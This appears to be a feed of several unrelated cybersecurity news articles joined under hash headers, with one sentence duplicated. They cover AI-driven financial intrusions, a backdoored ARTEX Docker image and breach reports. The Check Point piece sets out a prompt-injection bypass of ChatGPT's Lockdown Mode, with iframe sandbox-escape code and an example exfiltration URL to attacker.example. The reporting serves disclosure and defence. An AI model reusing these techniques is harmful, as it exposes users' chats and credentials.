Apple has revealed that it plans to start checking public iCloud links for harmful content starting with iOS 27.3, iPadOS 27.3, macOS 27.3, and visionOS 27.3.

The change specifically applies to scenarios where users share iCloud content, such as photos in iCloud Photos or files in iCloud Drive, by sharing a link and making it accessible to "Anyone with the link."

When users choose this option, it makes the content accessible to anyone who has the link, including Apple, the iPhone maker said.

"Starting in version 27.3 or later of iOS, iPadOS, macOS, and visionOS, items shared using Anyone with the Link will be checked by Apple for harmful content," it said in a support document published Tuesday.

Apple also explicitly noted that sharing an item that can be accessed by Anyone with the Link disables end-to-end encryption (E2EE), even if the owner or the recipients have turned on Advanced Data Protection, an optional setting that secures iCloud Backup, Photos, and Notes using E2EE.

That said, it's unclear what prompted this change, what Apple considers as "harmful content," and whether these checks will also be applied retroactively to previously generated links, as well as any new links created before the 27.3 updates are officially rolled out later this December.

The tech giant has also warned that if users attempt to upload harmful content, it can be removed or deleted at any time.

"Apple may also take action against your Apple Account, including blocking or disabling your Apple Account, blocking the ability to create a new Apple Account with the associated email address or phone number, or if necessary, involving law enforcement," it said.

5fa3d324e78c.text:
Vercel, the popular cloud platform for building and hosting websites and web applications, has announced the rollout of Device Bound Session Credentials (DBSC) and the launch of Vercel Security Review in public beta.

Making stolen session cookies worthless

Device Bound Session Credentials is a security technology designed to limit the consequences of an infostealer infection and to thwart attackers’ session hijacking attempts.

Aside from stealing authentication credentials, modern info-stealing malware such as Lumma, RedLine, and Vidar can also steal browser cookies. Session cookies are especially valuable because they are issued after login, including after multi-factor authentication. An attacker who replays one (in a so-called “pass-the-cookie” attack) can get into an account without the password or the second factor.

DBSC effectively ties a login session to the device it was created on. The browser generates a public/private key pair, and the private key is stored in secure hardware on the device (such as a TPM or Secure Enclave) so it cannot be exported.

The server then issues short-lived cookies that the browser has to keep refreshing by proving it holds the private key. So even if a cookie is stolen, it expires quickly, and without the key the attacker can’t refresh it.

“If a user’s device does not support secure key storage, DBSC gracefully falls back to standard behavior without breaking the authentication flow,” says Google.

“DBSC is currently only supported by Chrome on Mac and Windows. We are also working on a kind of polyfill for other browsers. However, the polyfill is less secure and we would love to see broader browser adoption,” Vercel CTO Malte Ubl explained on Tuesday.

Vercel is rolling out DBSC slowly, because the technology is new, still not widespread, and “in our case there were lots of special cases for things like [OAuth] apps that we needed to resolve,” Ubl added.

He said Vercel is also working on shipping a related technology – Demonstrating Proof-of-Possession (DPoP) – for its command-line interface (CLI).

Vercel Agent now checks code for security flaws

This week, Vercel also opened up Vercel Security Review to Pro and Enterprise teams.

Part of Vercel Agent, the offering is an AI code scanner that checks users’ code for security vulnerabilities every time they push to GitHub.

It scans the code that changed since the branch’s previous deployment, reads the surrounding code, traces how the changed code can be reached, and checks for existing protections before reporting anything.

Findings appear as comments on pull requests, are listed in the Security dashboard, and are available via CLI.

Security reviews are triggered by GitHub push events. (Source: Vercel)

“Every finding explains the vulnerability and how to fix it, with links to the commit and deployment where it first appeared,” Vercel explained.

Users can have Vercel Agent verify a finding and commit a minimal fix, including updated tests, or pass the details to their own coding agent.

Use of Security Review is free until November 10, 2026.

4a08f28d4046.text:
Arkose Labs has expanded Arkose Agent Trust Manager to help businesses control agentic traffic. Companies can classify agent sessions, apply allow, monitor or block policies at each step of the customer journey, and track the same agent across multiple networks.

The need is urgent given Arkose Labs’ State of Agentic AI Trust Q3 report found that personal AI agents identify themselves less than 3% of the time. Rules that wait for an agent to announce itself miss almost all of them. These controls can be managed, combined with additional intelligence sources, and shared with internal teams via the Command Center.

“Agents are already changing how they identify themselves to avoid being blocked, and they can pass authentication steps built for people. Businesses can no longer count on agents to announce who they are,” said Kevin Gosschalk, CEO of Arkose Labs. “With Agent Trust Manager, they decide what every agent is allowed to do at each step of the customer journey, and those rules hold even when an agent changes its signals or its network.”

New Agent Trust Manager capabilities include:

Agent orchestration: Businesses lay out their customer journey step by step, sign-up, login, checkout, money movement, and set a policy for each: allow, monitor, or block. Arkose Titan applies it while the interaction happens.

Agent Visibility and Classification: Every agent session is classified as self-disclosing good, non-disclosing good, or malicious, so businesses know which agents are in their flows and whether each one is acting for a real customer.

Agent rules and agent block message: Enforce the policy and tell the agent why: a blocked agent sees a clear message in the business’s brand that the workflow is not supported for agents, with a pointer to the path that is.

Ask Titan and AI Assist integration (MCP): Plain-language answers about the agents in a business’s traffic, in Command Center or in the AI assistant it already uses, governed by existing roles.

Introducing Arkose Agent ID: Arkose Labs is introducing Agent ID, which follows the agent, not the IP: a stable identifier for each agent that holds when it rotates networks, ships a new build, or appears across many accounts.

Introducing Detection Auditing: Arkose is introducing detection auditing, an audit trail for agent detection: when signals were updated, what each session was classified as at the time, and what a new signal would have caught, exportable from Command Center.

Global intel: How a business’s agentic traffic compares with the Arkose network: agent mix over time, attack campaigns and origin countries.

Proof of human (coming soon): For steps a business marks as sensitive, such as moving money, Arkose Labs is launching a way to require a person to confirm before an agent can continue.

Agent Trust Manager already shows businesses which agents in their traffic are self-disclosing good, non-disclosing good or malicious. The new controls let them act on that view by applying the right policy to each population of agents at each step.

c707ff2c5431.text:
Financial companies are being targeted in successive attacks by a newly identified cyber threat actor known as ‘Crafty Falcon’ using AI and agentic AI tools, including some previously attributed to Chinese hacking groups.

In a new security advisory published on November 4, the Indian Computer Emergency Response Team (CERT-In) warned that non-banking financial companies, including digital lending platforms, fintech firms, payment aggregators, payment services providers and cryptocurrency exchanges, have reported falling victim to repeated cyber-attacks.

Some of them received a restricted-distribution advisory in early October warning them of cyber threat actors exploiting application programmable interfaces (APIs) traditionally used for payment and disbursement transactions to make unauthorized transfers.

Despite undertaking remediation after receiving this previous warning, these financial organizations were attacked again, with CERT-In noting “incomplete remediation” on their part.

Attacks were typically observed during holiday periods, on weekends and “other low-monitoring windows” to delay detection and response, CERT-In added.

Crafty Falcon’s Attack Lifecycle

According to CERT-In’s Finance branch (CERT-Fin), Crafty Falcon is a previously undocumented threat actor that uses a range of AI and agentic AI penetration testing tools to breach the systems of its victims.

Typically, Crafty Falcon gains initial access through internet-exposed non-production environments, such as user acceptance testing (UAT), staging and testing environments.

Once inside, the threat actor moves from non-production environments into production systems by exploiting shared credentials, authentication tokens or network paths between the environments.

The actor reverse-engineers the organization's application codebases to develop tailored exploits. They then use altered or modified application packages to initiate unauthorized API calls, bypassing security controls that assume only the legitimate client application will communicate with the APIs.

The actor also bypasses IP allow-listing restrictions by routing traffic through whitelisted third-party fetcher IP pools, such as content-acceleration services and app-store review fetchers. These shared services can be instructed by any internet user to fetch arbitrary URLs, allowing the actor to originate traffic from IP addresses already trusted by the organization.

Another Crafty Falcon characteristic move is to target the victim’s cloud infrastructure, including compute, serverless and management services. Cloud management services, such as AWS Systems Manager and Lambda, are abused to execute commands and deploy malicious files, allowing malicious activity to blend into legitimate cloud management operations.

Before executing large-value transfers, the actor performs micro-value test transactions, such as transactions of Rs. 1, to validate that unauthorized fund flows are possible. They exploit or abuse merchant settlement APIs belonging to payment aggregators to move funds.

The actor targets cryptocurrency exchanges and virtual digital asset service providers, stealing wallet keys and siphoning funds from cryptocurrency wallets.

CERT-In noted that Crafty Flacon also exploits newly published vulnerabilities as soon as they become publicly available. These include file-upload and deserialization exploit chains, leading to the deployment of web shells in PHP and Node.js applications.

Throughout these activities, Crafty Falcon creates large numbers of custom, tailored scripts on the fly. Functionally identical variants are refined in rapid succession, a pattern consistent with AI-generated code and iterative AI-assisted development.

Notably, CERT-In and CERT-Fin observed the use – and combination – of several AI-powered offensive security tools against affected entities. These include:

Penetration testing tool ARTEX, based on PentAGI, an autonomous, multi-agent framework that can be plugged to large language models (LLMs)

Penetration testing framework CyberStrikeAI

Attack search engine Cairn

These tools allow attackers to “execute complete attack chains autonomously at machine speed, generate and refine large numbers of tailored attack scripts in rapid succession and adapt their payloads based on target responses,” CERT-IN indicated.

While these tools are publicly available and could be used by many threat actors, most previous malicious campaigns where they were deployed were linked to China-based actors.

Read now: Chinese State Actor Used AI to Compromise ConnectWise Tenants

CERT-In Provides Crafty Falcon Threat Mitigation Recommendations

In its latest advisory, CERT-In provided a long list of recommended security measures organizations can take to mitigate the threat. These include:

Maintaining heightened 24/7 security monitoring, increased staffing and lower alert thresholds during holidays, weekends and periods of reduced monitoring

Centralizing real-time monitoring of cloud audit logs and alert on high-risk events, including remote command execution, serverless function code updates and creation of roles, users or access keys

Restricting cloud management and serverless execution to approved principals and accounts

Implementing instance metadata service protections, least-privilege roles, restrictions on wildcard egress and default-deny internet egress for serverless functions

Separating UAT, staging and testing environments from production, ensuring no shared credentials, tokens, API keys, databases or direct network paths

Making application deployment directories read-only for application runtime users and implement file-integrity monitoring to detect web shells

Treating client applications and packages as untrusted and enforcing server-side transaction validation, API request signing using nonces and timestamps, application attestation and certificate pinning

Establish rapid patching SLAs for Internet-facing applications, prioritizing file-upload and deserialization vulnerabilities in PHP and Node.js. Use WAF virtual patching as an interim measure

Extending real-time transaction monitoring to identify small-value test transactions to new beneficiaries followed by high-value transfers. Treat these as strong indicators of potentially unauthorized fund transfers and hold or review such transactions

Storing cryptocurrency wallet keys in hardware security modules or cold custody

Prohibiting unauthorized security and attack tools, including publicly available AI-driven offensive frameworks, on corporate infrastructure

Monitoring and governing LLM API usage and keys. LLM API traffic originating from servers or non-development hosts may indicate an attack infrastructure or planted operator console

Adjusting SIEM correlation to identify machine-speed, multi-technique attacks, parallel attack threads, adaptive payload changes and continuous activity outside business hours. Implement automated SOAR-based containment

Adopting zero-trust principles, micro-segmentation, identity-based access controls for every user and service and inspection of east-west traffic

The agency also urged organizations to report any suspicious activity that could be related to Crafty Falcon to incident@cert-in.org.in with all relevant logs and to contact the Indian Cybercrime Coordination Centre (I4C) and its Citizen Financial Cyber Fraud Reporting and Management System (CFCFRMS).

Read now: AI-Powered Cybercrime Tools Surge on Dark Web

c7ce0afe43e7.text:
The Indian Computer Emergency Response Team (CERT-In) has disclosed that an artificial intelligence (AI)-assisted threat actor it tracks as Crafty Falcon is targeting organizations in the Banking, Financial Services, and Insurance (BFSI) sectors in the country.

Describing the threat as active and ongoing, the activity involves the use of publicly-available AI-driven offensive security tools like ARTEX, PentAGI, Cairn, and CyberStrikeAI.

"These tools execute complete attack chains autonomously at machine speed, generate and refine large numbers of tailored attack scripts in rapid succession, and adapt their payloads based on target responses," CERT-In said. "The supporting attack infrastructure rotates IP addresses within hours to days."

The agency said the attacks have also targeted cryptocurrency exchanges and digital asset service providers, resulting in the theft of keys and funds.

The update follows an October 2026 alert issued by CERT-In, which warned of multiple cyber attack campaigns targeting non-banking financial companies (NBFCs), digital lending platforms, fintech entities, payment service providers, and cryptocurrency wallet operators.

Threat actors have been observed exploiting internet-facing applications and exposed APIs and privileged endpoints to steal payment aggregator/gateway and partner-bank API credentials, and then invoke fund-transfer APIs directly from within the entities' own allow-listed infrastructure.

Some of the other notable initial access vectors are listed below -

Use of stolen long-lived static, hard-coded API tokens

Supply chain compromise of source code repositories via forged commits

Exploitation of plaintext credentials in configuration files, source code, or databases

Access to applications and remote services lacking multi-factor authentication (MFA)

This approach, CERT-In added, defeats application-level controls such as loan creation, KYC, sanction, beneficiary verification, balance sufficiency, and per-transaction limits.

The rapidly executed fraudulent transactions are designed to move funds to attacker-controlled mule accounts across multiple banks. In addition, the attacks involve the operators taking steps to delete logs and tamper with endpoint security tools in an attempt to complicate detection and incident response efforts.

CERT-In also warned that attackers are targeting cloud infrastructure to execute commands and deploy malicious payloads, as well as publicly-accessible non-production environments to obtain shared credentials, tokens, or network paths, and then use them to pivot to production systems.

Other notable post-exploitation actions undertaken by the adversary are as follows -

Reverse-engineering application codebases to develop tailored exploits

Initiating unauthorized API calls using modified application packages, undermining controls that "assumed only the legitimate client application would call the APIs"

Executing micro-value test transactions (such as Rs. 1) to validate unauthorized fund flows before executing large-value transfers

Abusing merchant settlement APIs of payment aggregators to move funds

Exploiting newly disclosed vulnerabilities, including file-upload and deserialization exploit chains leading to web shells in PHP and Node.js applications

Creating a large number of custom scripts on the fly and iteratively improving them in quick succession, a pattern consistent with AI-assisted development

The development comes as CERT-In has published the Artificial Intelligence Security Auditing Guidelines, laying out specific requirements to ensure the "governance, security, privacy, fairness, transparency, resilience and auditability of AI systems."

The framework calls for testing an AI agent's documented identities, authorized objectives, approved tool use, permission boundaries, and its adherence to the principle of least privilege (PoLP). It also requires AI agents to require human approval for consequential actions, while ensuring high-risk AI systems incorporate emergency interruption, credential revocation, and controls for preventing automatic restarts.

"Effective assurance requires organisational accountability, technical testing, data and model governance, continuous monitoring, human oversight, incident response and third-party assurance," the agency said. "Accordingly, the framework provides auditable requirements proportionate to the nature, scale, autonomy and potential impact of each AI system."

Copycat ARTEX Version Hands Out Root Shell

The abuse of open-source penetration testing tools like ARTEX in real-world intrusions prompted its developer to take down the repository from GitHub. But multiple copies have sprung up on the Microsoft-owned code-hosting platform to fill the void -

github[.]com/trhhubsd/ARTEXX

github[.]com/mhtsec/ARTEX ("mianhuatang11/artex" on Docker Hub)

github[.]com/RuoJi6/ARTEX

The first two GitHub repositories are no longer available for download. According to an independent cybersecurity researcher who goes by the online alias Badbyte, the "trhhubsd/ARTEX" repository was starred 2,449 times and forked over 600 times.

What's notable about the GitHub copy is that it changed a single line in "docker-compose.yml" to pull the "tomicdd/artex" image from Docker Hub. The modified version conceals a new routine that grants a root shell during an unauthenticated request to the login endpoint. Per statistics shared by Docker Hub, the image has been downloaded 9,000 times.

"It adds a hidden verifyCaptcha() function to the login handler: if the CAPTCHA field starts with a secret marker, the rest runs through sh -c as root and the output is returned, before any credential check," the researcher said in a statement shared with The Hacker News via email. "That's an unauthenticated root shell on every install, and it never shows up in a code review."

"A compromised ARTEX instance holds its targets' unpatched findings, live credentials, captured sessions and network position. Whoever holds the backdoor can also quietly change what the agents do on the next run."

As many as 62 ARTEX consoles on the internet have been found to serve the backdoored build between November 2 and 4, 2026, with the first instance going up by October 20, 2026, twelve days after the Docker image was pushed. Of these, 26 consoles are located in the U.S., followed by 17 in Hong Kong and seven in China.

In all, a total of 1,645 hosts have been found serving the ARTEX console as of November 4, 2026. Besides "tomicdd/artex," a number of Docker Hub namespaces have been identified as publishing images named "artex." Some of them are listed below -

congdonglinux/artex (also backdoored and identical to "tomicdd/artex")

mianhuatang11/artex

autumn26/artex

andy1099zz/artex

dgddw/artex

trhhubsd/ARTEX

ylh440104/artex

"The backdoor's author needed nothing more. The people they were after had already chosen to run an unvetted attack tool as root on an open port," Badbyte said. "We know ARTEX has been used maliciously in the wild, and it will keep being used that way. We also know that plenty of legitimate, curious people installed it to see what the fuss was about. They did not sign up for a root shell on their own server."

d4fc0f3f15b8.text: Research by: Alexey Bukhteyev Key Takeaways OpenAI recently introduced Lockdown Mode, an optional advanced security setting designed to protect sensitive user data from prompt injection-based exfiltration attacks. Check Point Research discovered a vulnerability that allowed attackers to bypass Lockdown Mode, rendering its core protections ineffective. The vulnerability exposes a wide attack surface, enabling silent exfiltration of entire chat history, credential theft via phishing, and malware delivery. In ChatGPT Classic, the attack requires zero user interaction: simply having a conversation is enough to trigger silent data exfiltration. Introduction Earlier this year, Check Point Research disclosed a security flaw in ChatGPT’s code-execution runtime that allowed sensitive conversation data to be silently exfiltrated to an attacker-controlled server through DNS tunneling, a hidden outbound channel that bypassed the runtime’s network isolation. A fix for this issue was promptly deployed. Moreover, OpenAI later introduced a new security feature: Lockdown Mode. Lockdown Mode is an optional advanced security setting for logged-in ChatGPT users. Its purpose is to reduce the risk that a prompt-injection attack can exfiltrate sensitive data by causing ChatGPT or one of its tools to make outbound web, app, connector, or file-download requests. A classic example, described in OpenAI’s own write-up on URL safety, is an attacker tricking the AI into loading a link such as attacker.example/collect?data= — the private data ends up in the attacker’s server logs even though nothing suspicious ever appears in the chat. Recognizing that prompt injection remains a persistent risk regardless of implemented guardrails, Lockdown Mode mitigates it by cutting off the channels through which data could leave the conversation. When enabled, it restricts live web access to cached content, blocks the loading and display of images from the internet, disables network requests from Canvas-generated code, and turns off Deep Research, Agent Mode, live connectors, and file downloads. Figure 1 – ChatGPT Lockdown Mode notification displayed when Canvas tries to access an external resource. We found a vulnerability in ChatGPT that allowed an attacker to bypass Lockdown Mode and perform covert exfiltration of chat data to an external server. Video 1 – The entire chat history was transferred to a third-party server without any notification, bypassing Lockdown Mode. Potential attack scenarios involving this vulnerability were not limited to chat data leakage. The vulnerability allowed for manipulation of the ChatGPT Classic interface, including displaying popup windows with arbitrary content, opening the door to a wide range of phishing attacks. The attack could be carried out in several ways: through a malicious prompt, a malicious GPT, or a shared chat. The following sections cover the technical details behind the vulnerability and walk through the possible exploitation scenarios. Technical Details On February 2026, OpenAI added the HTML page preview feature into ChatGPT code blocks. It looks like the following: Figure 2 – HTML page preview in ChatGPT. Of course, the implementation includes several safeguards around this feature, since rendering user-controlled HTML with JavaScript inside the ChatGPT interface could otherwise create a direct path for private-data exfiltration. The most obvious attack scenarios include: Embedding an external image whose URL includes data from the chat: If such images could be rendered, an attacker could trigger zero-click exfiltration of private data. Embedding an external link: Download ChatGPT update This would allow attackers to place convincing social-engineering lures directly inside the ChatGPT interface and distribute them through shared chats. Opening a popup window with an arbitrary URL, either through a link with the target="_blank" directive:Click me or through JavaScript:window.open("", "_blank", "width=380,height=260"); This scenario would be especially risky in the ChatGPT Classic client, where users may perceive the popup as part of the trusted application context. Reading cookies or localStorage data for chatgpt.com. This would create a session-compromise risk. These scenarios are effectively mitigated through several layers of isolation and runtime enforcement. The rendered HTML is placed inside a sandbox, separating user-controlled content from the main ChatGPT application context, preventing the rendered page from directly accessing the parent document, ChatGPT UI state, cookies, or localStorage associated with chatgpt.com. All attempts by the page to send data to an external resource, or load remote images, scripts, links, or open arbitrary external URLs are intercepted by the sandbox and surfaced as warnings: Figure 3 – ChatGPT displays approval dialogs when a rendered HTML page attempts to access an external resource or when a user clicks an external link. The sandbox is implemented in two nested iframes. If we look at the implementation, we see that the sandbox doesn’t restrict some actions in the iframe. For example, the allow-popups and allow-popups-to-escape-sandbox permissions are enabled. Figure 4 – Sandbox attribute of the HTML-preview iframes, showing the permissive popup tokens (highlighted). The popups are controlled in a different way. The sandbox scripts redefine the window.open function: window.open: h=>{if(!h)return null;const{location:f}=r;return an(o,f,h),null} Thanks to that, when the webpage displayed in the iframe tries to open a popup, ChatGPT does not allow this until the action is approved by the user. When the page tries to open a popup with empty URL or about:blank the function just returns null , and the user does not even see a notification. However, popups are not explicitly restricted by the iframe sandbox, because it has the allow-popups token. Therefore, if we could get a real window.open function, we would be able to open a popup, bypassing the HTML sandbox restrictions, and even the Lockdown Mode. In fact, we can create a one more nested iframe inside our sandboxed page, and use its contentWindow.open function: window.open("about:blank"); // blocked // creating a nested iframe var f = document.createElement('iframe'); document.body.appendChild(f); f.contentWindow.open("about:blank"); // works Further, having managed to open a pop-up window, the attacker can place arbitrary HTML code in it, which will no longer be executed in the sandbox, since the token allow-popups-to-escape-sandbox is present. Attack surface: data exfiltration, phishing and malware downloding in a trusted interface. This vulnerability opens a wide attack surface. It could enable the covert theft of entire chat history and uploaded files, the distribution of malware disguised as a legitimate update, and even credential theft. Below, we walk through several scenarios and explain how each one works. Malware Delivery Through a Spoofed Application Window Typically, default browser settings prevent JavaScript from opening pop-up windows. Opening a new window normally requires an explicit user action, such as clicking a link or a button. An attacker needs to implement a plausible decoy to trick the user into clicking on a generated preview. Since the attacker controls the content of the generated page, crafting a convincing lure is straightforward. The window that opens will retain the ChatGPT application’s icon, while the title is controlled by an attacker, creating the impression that the user is still interacting with the ChatGPT application. This, for example, can be used to trick the user to download malware disguised as an application update. The ChatGPT Classic app does not allow automatic file downloads, so to download a file, the user must additionally click on the link. Video 2 – Malware delivery through a spoofed ChatGPT window. This scenario is even easier to implement in a browser, as automatic downloads are not blocked. Furthermore, the victim doesn’t even need to have an account, and the attacker only needs to share a chat containing a malicious page, making any clicks on content in shared chats dangerous: Video 3 – Malware delivery through a shared chat. Zero-Click Exploitation in ChatGPT Classic We found that window.open in the Electron-based ChatGPT Classic application works even without a user gesture. This makes the vulnerability significantly more dangerous: an attacker could silently exfiltrate data without requiring any interaction from the user, simply having a conversation would be enough to trigger the attack. This is demonstrated in Video 1, where a malicious GPT silently leaks chat messages to an attacker-controlled server. Beyond that, we also found it was possible to reload content in the main ChatGPT application window and perform certain actions on behalf of the user, such as forcibly signing them out of their account. This could allow an attacker to craft a convincing lure and trick the user into re-authenticating on an attacker-controlled page, thereby silently stealing their credentials. Video 4 – Credential theft. Conclusion Check Point Research responsibly disclosed this vulnerability to OpenAI. On September 18, 2026, OpenAI informed us that it had deployed a fix by removing the allow-popups and allow-popups-to-escape-sandbox permissions from the outer HTML-preview sandbox iframe. We subsequently retested the issue and confirmed that the exploitation technique described in this article no longer works. As AI assistants evolve into full execution environments, running code in the cloud and rendering content on the client side, all while handling medical records, financial data, and other highly sensitive information, every new capability expands the attack surface, including features built purely for convenience. Guardrails and the built-in security features of AI agents and applications help mitigate threats, but they still offer no absolute guarantee of protection. That is worth remembering before entrusting AI with sensitive information or granting it full access to your computer. Securing these systems requires looking beyond individual features and considering the platform as a whole. The benefits of modern AI assistants are enormous, but adopting them safely demands careful attention to every layer, including the ones users never think about. The post ChatGPT Lockdown Mode Bypass: Phishing, Malware Delivery, and Silent Data Exfiltration appeared first on Check Point Research.

6305e416c902.text:
Security teams have never lacked vulnerability data. The harder problem is deciding which issues create a credible path to business impact, then acting before that path can be used. As frontier AI makes it faster and less expensive to connect weaknesses, operational assumptions, and legitimate system behavior, that decision window is becoming even tighter.

The Gartner® report, Mythos Reprioritizes Cybersecurity Outcomes and Investments, examines what this shift means for cybersecurity priorities and investment. Rapid7 is offering complimentary access to the research, which we believe can help security leaders reassess how they prioritize exposure and infrastructure teams reassess how they plan response and recovery.

Why does AI change the vulnerability management equation?

Gartner states, “Mythos collapses the distance between theoretical weaknesses and executable attack scenarios, forcing cybersecurity to optimize for outcomes, not activity.” For leaders already managing more vulnerabilities than their teams can address, the pressure comes from the growing speed at which separate weaknesses can become a credible attack path.

The change also extends beyond one model. Gartner states, “By 2027, Mythos will be overtaken by new frontier-AI-enabled models, signaling that this moment is not about Mythos, but a new era of AI-assisted vulnerabilities and functional exploits.”

At Rapid7, we believe this requires a more attacker-aware view of exposure. A large backlog can contain thousands of issues with very different implications for the organization. Leaders need to understand which exposures are reachable, how they could be combined, which business services they affect, and what action would reduce risk most effectively.

What should security leaders measure instead?

Vulnerability counts, backlog size, and generic remediation targets show how much work a team has completed. They provide less clarity on whether an attacker’s options have narrowed or whether the organization can respond and recover more effectively.

Gartner advises, “Organizations must shift focus from volume and activity to speed of decision, effectiveness of response, and tangible reduction of enterprise risk in an environment where attacker reasoning scales rapidly.”

The report examines outcome-driven measures including “Attack path analysis coverage,” “Patching cadence,” “Compensating control deployment cadence,” “Mean time to remediate,” and “Technology debt.” We believe this gives leaders a stronger basis for connecting security investment with reduced exposure, faster action, and business resilience.

How can teams move from prioritization to action?

Better prioritization only creates value when teams can act on it. Gartner recommends, “Use attack path analysis to prioritize your patches, virtual patches, and compensating controls. This can scale down to a consideration of critical services mapped into critical business outcomes and exposure.”

Rapid7’s internal, practitioner-led exploration of Claude Mythos Preview through Project Glasswing reinforces our view that faster discovery is only the beginning. A model may help identify and validate a potential vulnerability, but reducing exposure still requires teams to understand affected systems, apply business context, choose the right remediation or compensating control, verify the result, and maintain detection coverage.

Rapid7’s vulnerability management capabilities support this operational path by bringing attack-surface visibility, threat intelligence, business context, and attack-path analysis together, helping teams identify which exposures matter most and coordinate remediation through existing workflows.

What does an outcome-led program look like?

An outcome-led program gives executives a clearer answer to a more useful question: which attacker opportunities did we reduce, and how quickly could we respond? It also supports ongoing decisions about technical debt, recovery planning, and where limited resources can deliver the greatest reduction in business risk.

Access the complimentary Gartner report, Mythos Reprioritizes Cybersecurity Outcomes and Investments, to explore how AI-assisted vulnerability discovery may change cybersecurity priorities, metrics, and investment decisions.

⠀

c7fa3eaa5f69.text:
The names and email addresses of 20,614 people registered on Norad’s Grants Portal may have ended up in the hands of attackers, Norway’s development aid agency has disclosed.

Norad, short for the Norwegian Agency for Development Cooperation, works with partners around the world on development aid. It operates the portal, and both the agency and Norway’s Ministry of Foreign Affairs use it to collect funding applications for aid projects.

According to the agency, the portal has been in use since 2017 and has 20,614 registered users representing 12,511 organizations worldwide, which means every one of those users may be affected.

“This is a serious incident,” said Torger Kjeldstad, director of the Department for Digitalisation at Norad.

“The portal was closed down immediately, and we are still working to determine the full extent of the attack. At this stage, we do not know who is behind it. Our digital services must be safe to use, and we will do everything we can to get to the bottom of what has happened,” Kjeldstad added.

Stolen logins opened the door

The intrusion was discovered on 30 October. The perpetrators got in by logging in with 27 compromised user accounts, and Norad contacted the owners of those accounts on Tuesday.

The intruders also stole applications and supporting documents submitted by three organizations based outside Norway, though the agency warned that others could turn out to be affected.

Norad added that it cannot rule out that the attackers saw the names of applicants who operate in conflict zones and authoritarian states.

Outside experts brought in

Norad mobilized its crisis management team to deal with the incident. “The attack is complex. While we have a good understanding of the incident, we are engaging external cybersecurity experts to ensure we have a complete picture of the attack,” Kjeldstad explained, noting that they will provide “a detailed assessment of what information the attackers gained access to.”

The agency has reported the incident to the police, the Norwegian Data Protection Authority (Datatilsynet) and the Norwegian National Security Authority (NSM). NSM confirmed that the attack shares characteristics with other recent cyberattacks, though Norad’s statement does not say which ones.

Norad is working on notifying the 20,614 registered users and the three organizations it knows were hit. “It is important for us to inform those affected,” Kjeldstad stressed.

“We view this as an extremely serious matter. It is now critical that we gain a complete understanding of the attack and its potential consequences,” concluded Kjeldstad.

The agency says it will update its statement as the investigation continues.

2662c25756f1.text:
A cybersecurity incident forced UNM Health to divert ambulances, cancel appointments, and pause care while it contained the threat.

On Monday, October 26, the University of New Mexico Health System (UNM Health) faced the kind of security incident that healthcare leaders dread: one serious enough to change how patients could receive emergency care.

A major hospital network in New Mexico worked urgently on Monday to fix a cybersecurity problem. The issue forced it to send ambulances to other hospitals and left the state without a hospital emergency department able to treat the most serious injuries.

UNM Health operates New Mexico’s only Level 1 trauma center. These centers treat the most serious and complex injuries. Even a temporary closure can put extra pressure on other hospitals.

UNM Health runs New Mexico’s only Level 1 trauma center. That matters because a Level 1 center handles the most complex injuries, and losing even temporary access to it puts pressure on every nearby hospital.

The organization told patients not to come to its main Albuquerque hospital and canceled appointments across more than 30 clinics.

“The University of New Mexico Health System is experiencing a cybersecurity issue at this time. UNM Health officials are actively working to resolve this issue. Currently, all ambulance traffic is being diverted to other hospitals and all appointments at all clinics today have been cancelled. UNM Health patients should not show up to UNM Health facilities on October 26. Emergencies should be handled by 911 and non-emergencies should be delayed until further notice.” reads the update published by the organization on October 26, 2026. “The cybersecurity threat is affecting the entire University of New Mexico Health Sciences Center. “

UNM said its IT security teams identified the threat around 11 a.m. and began containment work. They later said the event affected some end-user devices but did not reach core systems or servers.

Leadership activated an Emergency Operations Center, brought in outside support, and notified state and federal law enforcement. That is the right sequence: isolate first, investigate second, communicate continuously.

From 12:30 to 2:30 p.m., UN Health temporarily stopped accepting new patients while teams protected the network. “System outages also required the suspension of outpatient surgeries and appointments for the remainder of the day.”

This was not an abstract IT problem. Patients arrived for care and were told to reschedule. Staff had to explain, repeatedly, why a hospital visit could not proceed as planned.

UNM also canceled classes at its Health Sciences Center and sent nonessential employees home. Medical, nursing, pharmacy, and population health students lost a day of instruction because the institution had to protect its network.

Other providers stepped in. Presbyterian Healthcare Services and Lovelace Health System coordinated with UNM and took additional patients, which is exactly what a functioning regional healthcare system should do.

UNM Health began restoring its systems on Monday afternoon. By the following day, hospitals, ambulance services and clinics were back to normal.

The incident is still under criminal investigation. Employees reported messages claiming that patient, student and staff data had been stolen, but UNM has not confirmed this. The hospital also warned people to watch out for phishing and fraud attempts by attackers exploiting the incident.

Follow me on Twitter: @securityaffairs and Facebook and Mastodon

Pierluigi Paganini

(SecurityAffairs – hacking, UNM Health)

PortSwigger has announced the availability of Burp AT for enterprises, an agentic pentesting solution that helps security teams investigate important applications more deeply and more often.

Burp AT combines specialist Burp tools, purpose-built pentesting skills developed with PortSwigger Research, and relevant application context. Agents plan their testing approach, use Burp’s web security testing tools, and adapt as they learn.

For AppSec leaders balancing testing priorities with limited expert capacity, Burp AT helps teams pursue investigations that would otherwise wait, revisit applications as they change, and carry out in-depth testing more often, over more of their estate.

Security teams choose how much authority to delegate, from guided investigations to autonomous execution of defined tests. Burp deterministically enforces configured scope and permissions, not the model itself, while experts assess the evidence to decide which weaknesses to address and where further investigation is needed.

“Pentesters have shown what agentic testing can do on a single application with Burp AT,” said Chris Wood, Product Manager at PortSwigger. “The question for security teams is how to bring that to a whole application estate without losing control. Burp AT now lets teams run agentic tests at scale, with the scope and safeguards set in advance, whilst ensuring that teams can stop and see what the agent is doing. Teams get that depth across more of their applications, with control built in.”

Testing with specialist tools and research-led methods

Burp AT helps teams bring specialist testing depth to more applications, equipping agents with the Burp tools professional pentesters use and purpose-built skills developed with PortSwigger Research.

The specialist tools are designed to handle malformed traffic and unusual behaviour that is inherent to security testing. Research-led skills give agents structured methods to pursue promising leads and adapt to the evidence, so organisations get consistent, comparable results across every application they test.

“The best results from agentic testing come from giving agents the right tools, not just a capable model,” said Tom Shelton-Lefley, Product Manager at PortSwigger.

“Burp AT lets agents use Burp’s specialist tools autonomously, guided by workflows our researchers have tested in practice. In Burp AT, an orchestration layer ties those tools together into a complete test that helps agents remain consistent across tests by following defined pentesting methodologies. The agent brings the reasoning, and Burp brings the precision, which is how autonomous testing delivers the depth teams need.”

Autonomy on the organisation’s terms

Organisations choose how much testing to automate and where their teams stay closely involved, from user-guided to autonomous execution of defined tests. Teams can increase or reduce the authority they delegate according to the application, task, and organisation’s risk appetite, whilst retaining the ability to step in when needed.

